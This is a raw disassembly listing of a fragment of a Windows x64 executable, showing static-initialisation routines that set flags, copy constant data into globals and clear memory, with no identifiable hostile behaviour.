   140007a47:	c6 05 6a 64 28 00 01 	movb   $0x1,0x28646a(%rip)        # 0x14028deb8
   140007a4e:	80 3d 17 6e 28 00 00 	cmpb   $0x0,0x286e17(%rip)        # 0x14028e86c
   140007a55:	0f 85 c5 df ff ff    	jne    0x140005a20
   140007a5b:	e9 9e e0 ff ff       	jmp    0x140005afe
   140007a60:	48 8d 0d 2f 37 00 00 	lea    0x372f(%rip),%rcx        # 0x14000b196
   140007a67:	e8 64 12 00 00       	call   0x140008cd0
   140007a6c:	48 8d 0d bd 13 00 00 	lea    0x13bd(%rip),%rcx        # 0x140008e30
   140007a73:	e8 f8 98 ff ff       	call   0x140001370
   140007a78:	c6 05 3a 64 28 00 01 	movb   $0x1,0x28643a(%rip)        # 0x14028deb9
   140007a7f:	80 3d 26 6e 28 00 00 	cmpb   $0x0,0x286e26(%rip)        # 0x14028e8ac
   140007a86:	0f 85 a9 e0 ff ff    	jne    0x140005b35
   140007a8c:	e9 7e e1 ff ff       	jmp    0x140005c0f
   140007a91:	48 8d 0d 3a 37 00 00 	lea    0x373a(%rip),%rcx        # 0x14000b1d2
   140007a98:	e8 b3 13 00 00       	call   0x140008e50
   140007a9d:	48 8d 0d ec 14 00 00 	lea    0x14ec(%rip),%rcx        # 0x140008f90
   140007aa4:	e8 c7 98 ff ff       	call   0x140001370
   140007aa9:	c6 05 0a 64 28 00 01 	movb   $0x1,0x28640a(%rip)        # 0x14028deba
   140007ab0:	80 3d 31 6e 28 00 00 	cmpb   $0x0,0x286e31(%rip)        # 0x14028e8e8
   140007ab7:	0f 85 89 e1 ff ff    	jne    0x140005c46
   140007abd:	e9 37 e2 ff ff       	jmp    0x140005cf9
   140007ac2:	48 8d 0d 41 37 00 00 	lea    0x3741(%rip),%rcx        # 0x14000b20a
   140007ac9:	e8 f2 14 00 00       	call   0x140008fc0
   140007ace:	48 8d 0d 2b 16 00 00 	lea    0x162b(%rip),%rcx        # 0x140009100
   140007ad5:	e8 96 98 ff ff       	call   0x140001370
   140007ada:	c6 05 da 63 28 00 01 	movb   $0x1,0x2863da(%rip)        # 0x14028debb
   140007ae1:	80 3d 40 6e 28 00 00 	cmpb   $0x0,0x286e40(%rip)        # 0x14028e928
   140007ae8:	0f 85 42 e2 ff ff    	jne    0x140005d30
   140007aee:	e9 f0 e2 ff ff       	jmp    0x140005de3
   140007af3:	c6 05 92 64 28 00 01 	movb   $0x1,0x286492(%rip)        # 0x14028df8c
   140007afa:	48 8d 0d ef 63 28 00 	lea    0x2863ef(%rip),%rcx        # 0x14028def0
   140007b01:	48 8d 15 f8 2f 00 00 	lea    0x2ff8(%rip),%rdx        # 0x14000ab00
   140007b08:	41 b8 9c 00 00 00    	mov    $0x9c,%r8d
   140007b0e:	e8 9d 21 00 00       	call   0x140009cb0
   140007b13:	48 8d 0d 06 bd ff ff 	lea    -0x42fa(%rip),%rcx        # 0x140003820
   140007b1a:	e8 51 98 ff ff       	call   0x140001370
   140007b1f:	c6 05 6c 63 28 00 01 	movb   $0x1,0x28636c(%rip)        # 0x14028de92
   140007b26:	80 3d 5f 64 28 00 00 	cmpb   $0x0,0x28645f(%rip)        # 0x14028df8c
   140007b2d:	0f 85 66 e3 ff ff    	jne    0x140005e99
   140007b33:	e9 c1 e4 ff ff       	jmp    0x140005ff9
   140007b38:	c6 05 3d 6e 28 00 01 	movb   $0x1,0x286e3d(%rip)        # 0x14028e97c
   140007b3f:	0f 10 05 fc 36 00 00 	movups 0x36fc(%rip),%xmm0        # 0x14000b242
   140007b46:	0f 29 05 e3 6d 28 00 	movaps %xmm0,0x286de3(%rip)        # 0x14028e930
   140007b4d:	0f 10 05 fe 36 00 00 	movups 0x36fe(%rip),%xmm0        # 0x14000b252
   140007b54:	0f 29 05 e5 6d 28 00 	movaps %xmm0,0x286de5(%rip)        # 0x14028e940
   140007b5b:	0f 10 05 00 37 00 00 	movups 0x3700(%rip),%xmm0        # 0x14000b262
   140007b62:	0f 29 05 e7 6d 28 00 	movaps %xmm0,0x286de7(%rip)        # 0x14028e950
   140007b69:	0f 10 05 02 37 00 00 	movups 0x3702(%rip),%xmm0        # 0x14000b272
   140007b70:	0f 29 05 e9 6d 28 00 	movaps %xmm0,0x286de9(%rip)        # 0x14028e960
   140007b77:	f3 0f 6f 05 ff 36 00 	movdqu 0x36ff(%rip),%xmm0        # 0x14000b27e
   140007b7e:	00 
   140007b7f:	f3 0f 7f 05 e5 6d 28 	movdqu %xmm0,0x286de5(%rip)        # 0x14028e96c
   140007b86:	00 
   140007b87:	48 8d 0d a2 15 00 00 	lea    0x15a2(%rip),%rcx        # 0x140009130
   140007b8e:	e8 dd 97 ff ff       	call   0x140001370
   140007b93:	c6 05 22 63 28 00 01 	movb   $0x1,0x286322(%rip)        # 0x14028debc
   140007b9a:	80 3d db 6d 28 00 00 	cmpb   $0x0,0x286ddb(%rip)        # 0x14028e97c
   140007ba1:	0f 85 0d e6 ff ff    	jne    0x1400061b4
   140007ba7:	e9 f8 e6 ff ff       	jmp    0x1400062a4
   140007bac:	c6 05 51 6e 28 00 01 	movb   $0x1,0x286e51(%rip)        # 0x14028ea04
   140007bb3:	48 8d 0d c6 6d 28 00 	lea    0x286dc6(%rip),%rcx        # 0x14028e980
   140007bba:	48 8d 15 cd 36 00 00 	lea    0x36cd(%rip),%rdx        # 0x14000b28e
   140007bc1:	41 b8 84 00 00 00    	mov    $0x84,%r8d
   140007bc7:	e8 e4 20 00 00       	call   0x140009cb0
   140007bcc:	48 8d 0d 8d 15 00 00 	lea    0x158d(%rip),%rcx        # 0x140009160
   140007bd3:	e8 98 97 ff ff       	call   0x140001370
   140007bd8:	c6 05 de 62 28 00 01 	movb   $0x1,0x2862de(%rip)        # 0x14028debd
   140007bdf:	80 3d 1e 6e 28 00 00 	cmpb   $0x0,0x286e1e(%rip)        # 0x14028ea04
   140007be6:	0f 85 ef e6 ff ff    	jne    0x1400062db
   140007bec:	e9 e8 e7 ff ff       	jmp    0x1400063d9
   140007bf1:	48 8d 0d 72 32 00 00 	lea    0x3272(%rip),%rcx        # 0x14000ae6a
   140007bf8:	e8 03 09 00 00       	call   0x140008500
   140007bfd:	48 8d 0d ec 09 00 00 	lea    0x9ec(%rip),%rcx        # 0x1400085f0
   140007c04:	e8 67 97 ff ff       	call   0x140001370
   140007c09:	c6 05 97 62 28 00 01 	movb   $0x1,0x286297(%rip)        # 0x14028dea7
   140007c10:	80 3d f3 67 28 00 00 	cmpb   $0x0,0x2867f3(%rip)        # 0x14028e40a
   140007c17:	0f 85 cc d1 ff ff    	jne    0x140004de9
   140007c1d:	e9 3d d2 ff ff       	jmp    0x140004e5f
   140007c22:	c6 05 7b 63 28 00 01 	movb   $0x1,0x28637b(%rip)        # 0x14028dfa4
   140007c29:	66 0f 6f 05 af 2d 00 	movdqa 0x2daf(%rip),%xmm0        # 0x14000a9e0
   140007c30:	00 
   140007c31:	66 0f 7f 05 57 63 28 	movdqa %xmm0,0x286357(%rip)        # 0x14028df90
   140007c38:	00 
   140007c39:	c7 05 5d 63 28 00 c5 	movl   $0x5d00c5,0x28635d(%rip)        # 0x14028dfa0
   140007c40:	00 5d 00 
   140007c43:	48 8d 0d 26 bc ff ff 	lea    -0x43da(%rip),%rcx        # 0x140003870
   140007c4a:	e8 21 97 ff ff       	call   0x140001370
   140007c4f:	c6 05 3d 62 28 00 01 	movb   $0x1,0x28623d(%rip)        # 0x14028de93
   140007c56:	80 3d 47 63 28 00 00 	cmpb   $0x0,0x286347(%rip)        # 0x14028dfa4
   140007c5d:	0f 85 4f e4 ff ff    	jne    0x1400060b2
   140007c63:	e9 91 e4 ff ff       	jmp    0x1400060f9
   140007c68:	c6 05 c3 74 28 00 01 	movb   $0x1,0x2874c3(%rip)        # 0x14028f132
   140007c6f:	48 b8 97 00 7a 00 7a 	movabs $0x97007a007a0097,%rax
   140007c76:	00 97 00 
   140007c79:	48 89 05 a8 74 28 00 	mov    %rax,0x2874a8(%rip)        # 0x14028f128
   140007c80:	66 c7 05 a7 74 28 00 	movw   $0x3b,0x2874a7(%rip)        # 0x14028f130
   140007c87:	3b 00 
   140007c89:	48 8d 0d 20 bc ff ff 	lea    -0x43e0(%rip),%rcx        # 0x1400038b0
   140007c90:	e8 db 96 ff ff       	call   0x140001370
   140007c95:	c6 05 2d 62 28 00 01 	movb   $0x1,0x28622d(%rip)        # 0x14028dec9
   140007c9c:	80 3d 8f 74 28 00 00 	cmpb   $0x0,0x28748f(%rip)        # 0x14028f132
   140007ca3:	0f 85 9a e7 ff ff    	jne    0x140006443
   140007ca9:	e9 d1 e7 ff ff       	jmp    0x14000647f
   140007cae:	48 8d 0d 5d 36 00 00 	lea    0x365d(%rip),%rcx        # 0x14000b312
   140007cb5:	e8 f6 14 00 00       	call   0x1400091b0
   140007cba:	48 8d 0d bf 15 00 00 	lea    0x15bf(%rip),%rcx        # 0x140009280
   140007cc1:	e8 aa 96 ff ff       	call   0x140001370
   140007cc6:	c6 05 f1 61 28 00 01 	movb   $0x1,0x2861f1(%rip)        # 0x14028debe
   140007ccd:	80 3d 5e 6d 28 00 00 	cmpb   $0x0,0x286d5e(%rip)        # 0x14028ea32
   140007cd4:	0f 85 b1 e9 ff ff    	jne    0x14000668b
   140007cda:	e9 02 ea ff ff       	jmp    0x1400066e1
   140007cdf:	c6 05 a4 6d 28 00 01 	movb   $0x1,0x286da4(%rip)        # 0x14028ea8a
   140007ce6:	0f 10 05 47 36 00 00 	movups 0x3647(%rip),%xmm0        # 0x14000b334
   140007ced:	0f 29 05 4c 6d 28 00 	movaps %xmm0,0x286d4c(%rip)        # 0x14028ea40
   140007cf4:	0f 10 05 49 36 00 00 	movups 0x3649(%rip),%xmm0        # 0x14000b344
   140007cfb:	0f 29 05 4e 6d 28 00 	movaps %xmm0,0x286d4e(%rip)        # 0x14028ea50
   140007d02:	0f 10 05 4b 36 00 00 	movups 0x364b(%rip),%xmm0        # 0x14000b354
   140007d09:	0f 29 05 50 6d 28 00 	movaps %xmm0,0x286d50(%rip)        # 0x14028ea60
   140007d10:	0f 10 05 4d 36 00 00 	movups 0x364d(%rip),%xmm0        # 0x14000b364
   140007d17:	0f 29 05 52 6d 28 00 	movaps %xmm0,0x286d52(%rip)        # 0x14028ea70
   140007d1e:	f3 0f 6f 05 48 36 00 	movdqu 0x3648(%rip),%xmm0        # 0x14000b36e
   140007d25:	00 
   140007d26:	f3 0f 7f 05 4c 6d 28 	movdqu %xmm0,0x286d4c(%rip)        # 0x14028ea7a
   140007d2d:	00 
   140007d2e:	48 8d 0d 6b 15 00 00 	lea    0x156b(%rip),%rcx        # 0x1400092a0
   140007d35:	e8 36 96 ff ff       	call   0x140001370
   140007d3a:	c6 05 7e 61 28 00 01 	movb   $0x1,0x28617e(%rip)        # 0x14028debf
   140007d41:	80 3d 42 6d 28 00 00 	cmpb   $0x0,0x286d42(%rip)        # 0x14028ea8a
   140007d48:	0f 85 ca e9 ff ff    	jne    0x140006718
   140007d4e:	e9 99 ea ff ff       	jmp    0x1400067ec
   140007d53:	48 8d 0d 24 36 00 00 	lea    0x3624(%rip),%rcx        # 0x14000b37e
   140007d5a:	e8 71 15 00 00       	call   0x1400092d0
   140007d5f:	48 8d 0d da 16 00 00 	lea    0x16da(%rip),%rcx        # 0x140009440
   140007d66:	e8 05 96 ff ff       	call   0x140001370
   140007d6b:	c6 05 4e 61 28 00 01 	movb   $0x1,0x28614e(%rip)        # 0x14028dec0
   140007d72:	80 3d 57 6d 28 00 00 	cmpb   $0x0,0x286d57(%rip)        # 0x14028ead0
   140007d79:	0f 85 a5 ea ff ff    	jne    0x140006824
   140007d7f:	e9 13 eb ff ff       	jmp    0x140006897
   140007d84:	c6 05 59 6d 28 00 01 	movb   $0x1,0x286d59(%rip)        # 0x14028eae4
   140007d8b:	48 b8 e9 00 da 00 e2 	movabs $0xe500e200da00e9,%rax
   140007d92:	00 e5 00 
   140007d95:	48 89 05 3c 6d 28 00 	mov    %rax,0x286d3c(%rip)        # 0x14028ead8
   140007d9c:	c7 05 3a 6d 28 00 d2 	movl   $0x9500d2,0x286d3a(%rip)        # 0x14028eae0
   140007da3:	00 95 00 
   140007da6:	48 8d 0d b3 16 00 00 	lea    0x16b3(%rip),%rcx        # 0x140009460
   140007dad:	e8 be 95 ff ff       	call   0x140001370
   140007db2:	c6 05 08 61 28 00 01 	movb   $0x1,0x286108(%rip)        # 0x14028dec1
   140007db9:	80 3d 24 6d 28 00 00 	cmpb   $0x0,0x286d24(%rip)        # 0x14028eae4
   140007dc0:	0f 85 1f eb ff ff    	jne    0x1400068e5
   140007dc6:	e9 61 eb ff ff       	jmp    0x14000692c
   140007dcb:	48 8d 0d ec 35 00 00 	lea    0x35ec(%rip),%rcx        # 0x14000b3be
   140007dd2:	e8 a9 16 00 00       	call   0x140009480
   140007dd7:	48 8d 0d 72 17 00 00 	lea    0x1772(%rip),%rcx        # 0x140009550
   140007dde:	e8 8d 95 ff ff       	call   0x140001370
   140007de3:	c6 05 d8 60 28 00 01 	movb   $0x1,0x2860d8(%rip)        # 0x14028dec2
   140007dea:	80 3d 23 6d 28 00 00 	cmpb   $0x0,0x286d23(%rip)        # 0x14028eb14
   140007df1:	0f 85 9f ec ff ff    	jne    0x140006a96
   140007df7:	e9 fd ec ff ff       	jmp    0x140006af9
   140007dfc:	c6 05 35 6d 28 00 01 	movb   $0x1,0x286d35(%rip)        # 0x14028eb38
   140007e03:	66 0f 6f 05 65 2c 00 	movdqa 0x2c65(%rip),%xmm0        # 0x14000aa70
   140007e0a:	00 
   140007e0b:	66 0f 7f 05 0d 6d 28 	movdqa %xmm0,0x286d0d(%rip)        # 0x14028eb20
   140007e12:	00 
   140007e13:	48 b8 fa 00 ff 00 e8 	movabs $0xab00e800ff00fa,%rax
   140007e1a:	00 ab 00 
   140007e1d:	48 89 05 0c 6d 28 00 	mov    %rax,0x286d0c(%rip)        # 0x14028eb30
   140007e24:	48 8d 0d 45 17 00 00 	lea    0x1745(%rip),%rcx        # 0x140009570
   140007e2b:	e8 40 95 ff ff       	call   0x140001370
   140007e30:	c6 05 8c 60 28 00 01 	movb   $0x1,0x28608c(%rip)        # 0x14028dec3
   140007e37:	80 3d fa 6c 28 00 00 	cmpb   $0x0,0x286cfa(%rip)        # 0x14028eb38
   140007e3e:	0f 85 79 ed ff ff    	jne    0x140006bbd
   140007e44:	e9 bb ed ff ff       	jmp    0x140006c04
   140007e49:	c6 05 0c 6d 28 00 01 	movb   $0x1,0x286d0c(%rip)        # 0x14028eb5c
   140007e50:	66 0f 6f 05 48 2c 00 	movdqa 0x2c48(%rip),%xmm0        # 0x14000aaa0
   140007e57:	00 
   140007e58:	66 0f 7f 05 e0 6c 28 	movdqa %xmm0,0x286ce0(%rip)        # 0x14028eb40
   140007e5f:	00 
   140007e60:	48 b8 2d 00 e9 00 20 	movabs $0x33002000e9002d,%rax
   140007e67:	00 33 00 
   140007e6a:	48 89 05 df 6c 28 00 	mov    %rax,0x286cdf(%rip)        # 0x14028eb50
   140007e71:	c7 05 dd 6c 28 00 20 	movl   $0xbb0020,0x286cdd(%rip)        # 0x14028eb58
   140007e78:	00 bb 00 
   140007e7b:	48 8d 0d 0e 17 00 00 	lea    0x170e(%rip),%rcx        # 0x140009590
   140007e82:	e8 e9 94 ff ff       	call   0x140001370
   140007e87:	c6 05 36 60 28 00 01 	movb   $0x1,0x286036(%rip)        # 0x14028dec4
   140007e8e:	80 3d c7 6c 28 00 00 	cmpb   $0x0,0x286cc7(%rip)        # 0x14028eb5c
   140007e95:	0f 85 ff ed ff ff    	jne    0x140006c9a
   140007e9b:	e9 61 ee ff ff       	jmp    0x140006d01
   140007ea0:	48 8d 0d 3b 35 00 00 	lea    0x353b(%rip),%rcx        # 0x14000b3e2
   140007ea7:	e8 04 17 00 00       	call   0x1400095b0
   140007eac:	48 8d 0d 8d 18 00 00 	lea    0x188d(%rip),%rcx        # 0x140009740
   140007eb3:	e8 b8 94 ff ff       	call   0x140001370
   140007eb8:	c6 05 06 60 28 00 01 	movb   $0x1,0x286006(%rip)        # 0x14028dec5
   140007ebf:	80 3d e0 6c 28 00 00 	cmpb   $0x0,0x286ce0(%rip)        # 0x14028eba6
   140007ec6:	0f 85 74 ee ff ff    	jne    0x140006d40
   140007ecc:	e9 20 ef ff ff       	jmp    0x140006df1
   140007ed1:	c6 05 f2 6c 28 00 01 	movb   $0x1,0x286cf2(%rip)        # 0x14028ebca
   140007ed8:	66 0f 6f 05 00 2c 00 	movdqa 0x2c00(%rip),%xmm0        # 0x14000aae0
   140007edf:	00 
   140007ee0:	66 0f 7f 05 c8 6c 28 	movdqa %xmm0,0x286cc8(%rip)        # 0x14028ebb0
   140007ee7:	00 
   140007ee8:	48 b8 6d 00 a4 00 b7 	movabs $0xa400b700a4006d,%rax
   140007eef:	00 a4 00 
   140007ef2:	48 89 05 c7 6c 28 00 	mov    %rax,0x286cc7(%rip)        # 0x14028ebc0
   140007ef9:	66 c7 05 c6 6c 28 00 	movw   $0x3f,0x286cc6(%rip)        # 0x14028ebc8
   140007f00:	3f 00 
   140007f02:	48 8d 0d 67 18 00 00 	lea    0x1867(%rip),%rcx        # 0x140009770
   140007f09:	e8 62 94 ff ff       	call   0x140001370
   140007f0e:	c6 05 b1 5f 28 00 01 	movb   $0x1,0x285fb1(%rip)        # 0x14028dec6
   140007f15:	80 3d ae 6c 28 00 00 	cmpb   $0x0,0x286cae(%rip)        # 0x14028ebca
   140007f1c:	0f 85 e5 ee ff ff    	jne    0x140006e07
   140007f22:	e9 3c ef ff ff       	jmp    0x140006e63
   140007f27:	c6 05 c2 71 28 00 01 	movb   $0x1,0x2871c2(%rip)        # 0x14028f0f0
   140007f2e:	48 8d 0d 97 6c 28 00 	lea    0x286c97(%rip),%rcx        # 0x14028ebcc
   140007f35:	48 8d 15 ec 34 00 00 	lea    0x34ec(%rip),%rdx        # 0x14000b428
   140007f3c:	41 b8 24 05 00 00    	mov    $0x524,%r8d
   140007f42:	e8 69 1d 00 00       	call   0x140009cb0
   140007f47:	48 8d 0d 42 18 00 00 	lea    0x1842(%rip),%rcx        # 0x140009790
   140007f4e:	e8 1d 94 ff ff       	call   0x140001370
   140007f53:	c6 05 6d 5f 28 00 01 	movb   $0x1,0x285f6d(%rip)        # 0x14028dec7
   140007f5a:	80 3d 8f 71 28 00 00 	cmpb   $0x0,0x28718f(%rip)        # 0x14028f0f0
   140007f61:	0f 85 16 ef ff ff    	jne    0x140006e7d
   140007f67:	e9 c3 ef ff ff       	jmp    0x140006f2f
   140007f6c:	c6 05 41 60 28 00 01 	movb   $0x1,0x286041(%rip)        # 0x14028dfb4
   140007f73:	48 b8 a6 00 c7 00 b4 	movabs $0xc500b400c700a6,%rax
   140007f7a:	00 c5 00 
   140007f7d:	48 89 05 24 60 28 00 	mov    %rax,0x286024(%rip)        # 0x14028dfa8
   140007f84:	c7 05 22 60 28 00 c7 	movl   $0x5300c7,0x286022(%rip)        # 0x14028dfb0
   140007f8b:	00 53 00 
   140007f8e:	48 8d 0d fb b8 ff ff 	lea    -0x4705(%rip),%rcx        # 0x140003890
   140007f95:	e8 d6 93 ff ff       	call   0x140001370
   140007f9a:	c6 05 f3 5e 28 00 01 	movb   $0x1,0x285ef3(%rip)        # 0x14028de94
   140007fa1:	80 3d 0c 60 28 00 00 	cmpb   $0x0,0x28600c(%rip)        # 0x14028dfb4
   140007fa8:	0f 85 f9 e9 ff ff    	jne    0x1400069a7
   140007fae:	e9 3b ea ff ff       	jmp    0x1400069ee
   140007fb3:	48 8b 8d 38 17 00 00 	mov    0x1738(%rbp),%rcx
   140007fba:	e8 9f 94 ff ff       	call   0x14000145e
   140007fbf:	cc                   	int3
   140007fc0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140007fc3:	0f 29 05 76 60 28 00 	movaps %xmm0,0x286076(%rip)        # 0x14028e040
   140007fca:	0f 29 05 5f 60 28 00 	movaps %xmm0,0x28605f(%rip)        # 0x14028e030
   140007fd1:	0f 29 05 48 60 28 00 	movaps %xmm0,0x286048(%rip)        # 0x14028e020
   140007fd8:	0f 29 05 31 60 28 00 	movaps %xmm0,0x286031(%rip)        # 0x14028e010
   140007fdf:	0f 29 05 1a 60 28 00 	movaps %xmm0,0x28601a(%rip)        # 0x14028e000
   140007fe6:	48 c7 05 5d 60 28 00 	movq   $0x0,0x28605d(%rip)        # 0x14028e04e
   140007fed:	00 00 00 00 
   140007ff1:	c3                   	ret
   140007ff2:	cc                   	int3
   140007ff3:	cc                   	int3
   140007ff4:	cc                   	int3
   140007ff5:	cc                   	int3
   140007ff6:	cc                   	int3
   140007ff7:	cc                   	int3
   140007ff8:	cc                   	int3
   140007ff9:	cc                   	int3
   140007ffa:	cc                   	int3
   140007ffb:	cc                   	int3
   140007ffc:	cc                   	int3
   140007ffd:	cc                   	int3
   140007ffe:	cc                   	int3
   140007fff:	cc                   	int3
   140008000:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008003:	0f 29 05 56 60 28 00 	movaps %xmm0,0x286056(%rip)        # 0x14028e060
   14000800a:	48 c7 05 5b 60 28 00 	movq   $0x0,0x28605b(%rip)        # 0x14028e070
   140008011:	00 00 00 00 
   140008015:	c3                   	ret
   140008016:	cc                   	int3
   140008017:	cc                   	int3
   140008018:	cc                   	int3
   140008019:	cc                   	int3
   14000801a:	cc                   	int3
   14000801b:	cc                   	int3
   14000801c:	cc                   	int3
   14000801d:	cc                   	int3
   14000801e:	cc                   	int3
   14000801f:	cc                   	int3
   140008020:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008023:	0f 29 05 56 60 28 00 	movaps %xmm0,0x286056(%rip)        # 0x14028e080
   14000802a:	c7 05 5c 60 28 00 00 	movl   $0x0,0x28605c(%rip)        # 0x14028e090
   140008031:	00 00 00 
   140008034:	c3                   	ret
   140008035:	cc                   	int3
   140008036:	cc                   	int3
   140008037:	cc                   	int3
   140008038:	cc                   	int3
   140008039:	cc                   	int3
   14000803a:	cc                   	int3
   14000803b:	cc                   	int3
   14000803c:	cc                   	int3
   14000803d:	cc                   	int3
   14000803e:	cc                   	int3
   14000803f:	cc                   	int3
   140008040:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008043:	0f 11 05 94 60 28 00 	movups %xmm0,0x286094(%rip)        # 0x14028e0de
   14000804a:	0f 29 05 7f 60 28 00 	movaps %xmm0,0x28607f(%rip)        # 0x14028e0d0
   140008051:	0f 29 05 68 60 28 00 	movaps %xmm0,0x286068(%rip)        # 0x14028e0c0
   140008058:	0f 29 05 51 60 28 00 	movaps %xmm0,0x286051(%rip)        # 0x14028e0b0
   14000805f:	0f 29 05 3a 60 28 00 	movaps %xmm0,0x28603a(%rip)        # 0x14028e0a0
   140008066:	c3                   	ret
   140008067:	cc                   	int3
   140008068:	cc                   	int3
   140008069:	cc                   	int3
   14000806a:	cc                   	int3
   14000806b:	cc                   	int3
   14000806c:	cc                   	int3
   14000806d:	cc                   	int3
   14000806e:	cc                   	int3
   14000806f:	cc                   	int3
   140008070:	c6 05 bd 60 28 00 01 	movb   $0x1,0x2860bd(%rip)        # 0x14028e134
   140008077:	0f b7 01             	movzwl (%rcx),%eax
   14000807a:	66 89 05 6f 60 28 00 	mov    %ax,0x28606f(%rip)        # 0x14028e0f0
   140008081:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008085:	66 89 05 66 60 28 00 	mov    %ax,0x286066(%rip)        # 0x14028e0f2
   14000808c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008090:	66 89 05 5d 60 28 00 	mov    %ax,0x28605d(%rip)        # 0x14028e0f4
   140008097:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000809b:	66 89 05 54 60 28 00 	mov    %ax,0x286054(%rip)        # 0x14028e0f6
   1400080a2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400080a6:	66 89 05 4b 60 28 00 	mov    %ax,0x28604b(%rip)        # 0x14028e0f8
   1400080ad:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400080b1:	66 89 05 42 60 28 00 	mov    %ax,0x286042(%rip)        # 0x14028e0fa
   1400080b8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400080bc:	66 89 05 39 60 28 00 	mov    %ax,0x286039(%rip)        # 0x14028e0fc
   1400080c3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400080c7:	66 89 05 30 60 28 00 	mov    %ax,0x286030(%rip)        # 0x14028e0fe
   1400080ce:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400080d2:	66 89 05 27 60 28 00 	mov    %ax,0x286027(%rip)        # 0x14028e100
   1400080d9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400080dd:	66 89 05 1e 60 28 00 	mov    %ax,0x28601e(%rip)        # 0x14028e102
   1400080e4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400080e8:	66 89 05 15 60 28 00 	mov    %ax,0x286015(%rip)        # 0x14028e104
   1400080ef:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400080f3:	66 89 05 0c 60 28 00 	mov    %ax,0x28600c(%rip)        # 0x14028e106
   1400080fa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400080fe:	66 89 05 03 60 28 00 	mov    %ax,0x286003(%rip)        # 0x14028e108
   140008105:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008109:	66 89 05 fa 5f 28 00 	mov    %ax,0x285ffa(%rip)        # 0x14028e10a
   140008110:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008114:	66 89 05 f1 5f 28 00 	mov    %ax,0x285ff1(%rip)        # 0x14028e10c
   14000811b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000811f:	66 89 05 e8 5f 28 00 	mov    %ax,0x285fe8(%rip)        # 0x14028e10e
   140008126:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000812a:	66 89 05 df 5f 28 00 	mov    %ax,0x285fdf(%rip)        # 0x14028e110
   140008131:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008135:	66 89 05 d6 5f 28 00 	mov    %ax,0x285fd6(%rip)        # 0x14028e112
   14000813c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008140:	66 89 05 cd 5f 28 00 	mov    %ax,0x285fcd(%rip)        # 0x14028e114
   140008147:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000814b:	66 89 05 c4 5f 28 00 	mov    %ax,0x285fc4(%rip)        # 0x14028e116
   140008152:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008156:	66 89 05 bb 5f 28 00 	mov    %ax,0x285fbb(%rip)        # 0x14028e118
   14000815d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008161:	66 89 05 b2 5f 28 00 	mov    %ax,0x285fb2(%rip)        # 0x14028e11a
   140008168:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000816c:	66 89 05 a9 5f 28 00 	mov    %ax,0x285fa9(%rip)        # 0x14028e11c
   140008173:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008177:	66 89 05 a0 5f 28 00 	mov    %ax,0x285fa0(%rip)        # 0x14028e11e
   14000817e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008182:	66 89 05 97 5f 28 00 	mov    %ax,0x285f97(%rip)        # 0x14028e120
   140008189:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000818d:	66 89 05 8e 5f 28 00 	mov    %ax,0x285f8e(%rip)        # 0x14028e122
   140008194:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008198:	66 89 05 85 5f 28 00 	mov    %ax,0x285f85(%rip)        # 0x14028e124
   14000819f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   1400081a3:	66 89 05 7c 5f 28 00 	mov    %ax,0x285f7c(%rip)        # 0x14028e126
   1400081aa:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   1400081ae:	66 89 05 73 5f 28 00 	mov    %ax,0x285f73(%rip)        # 0x14028e128
   1400081b5:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   1400081b9:	66 89 05 6a 5f 28 00 	mov    %ax,0x285f6a(%rip)        # 0x14028e12a
   1400081c0:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   1400081c4:	66 89 05 61 5f 28 00 	mov    %ax,0x285f61(%rip)        # 0x14028e12c
   1400081cb:	0f b7 41 3e          	movzwl 0x3e(%rcx),%eax
   1400081cf:	66 89 05 58 5f 28 00 	mov    %ax,0x285f58(%rip)        # 0x14028e12e
   1400081d6:	0f b7 41 40          	movzwl 0x40(%rcx),%eax
   1400081da:	66 89 05 4f 5f 28 00 	mov    %ax,0x285f4f(%rip)        # 0x14028e130
   1400081e1:	0f b7 41 42          	movzwl 0x42(%rcx),%eax
   1400081e5:	66 89 05 46 5f 28 00 	mov    %ax,0x285f46(%rip)        # 0x14028e132
   1400081ec:	c3                   	ret
   1400081ed:	cc                   	int3
   1400081ee:	cc                   	int3
   1400081ef:	cc                   	int3
   1400081f0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400081f3:	0f 29 05 26 5f 28 00 	movaps %xmm0,0x285f26(%rip)        # 0x14028e120
   1400081fa:	0f 29 05 0f 5f 28 00 	movaps %xmm0,0x285f0f(%rip)        # 0x14028e110
   140008201:	0f 29 05 f8 5e 28 00 	movaps %xmm0,0x285ef8(%rip)        # 0x14028e100
   140008208:	0f 29 05 e1 5e 28 00 	movaps %xmm0,0x285ee1(%rip)        # 0x14028e0f0
   14000820f:	c7 05 17 5f 28 00 00 	movl   $0x0,0x285f17(%rip)        # 0x14028e130
